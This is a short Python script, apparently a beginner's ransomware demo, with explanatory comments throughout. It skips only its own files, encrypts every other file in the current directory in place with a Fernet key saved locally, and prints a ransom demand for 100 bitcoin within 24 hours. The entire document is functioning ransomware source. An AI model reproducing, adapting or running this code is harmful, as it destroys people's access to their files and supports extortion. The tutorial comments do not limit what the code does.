import os
from cryptography.fernet import Fernet
#fernet is a  method of cryptography module which is used to encrypt the 
#files.
#finding files - to see all files in current directory. listdir method is used
# from OS module.
files=[]
for file in os.listdir():
	if file == "ransomware.py" or file ==  "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
key = Fernet.generate_key()
with open("thekey.key","wb") as f:
	f.write(key)

#this key will be encrypted too along with other files. so to prevent that 
#from happening we enter an if statement above in list of files to be 
#encrypted

#the below for loop will encrypt all files.
for file in files:
	with open(file,"rb") as f:
		contents=f.read()
	encrypted_contents = Fernet(key).encrypt(contents)
	with open(file,"wb") as f:
		f.write(encrypted_contents)

print("Your files are all encrypted!!! send 100 bitcoin in next 24 hours to unlock your files")

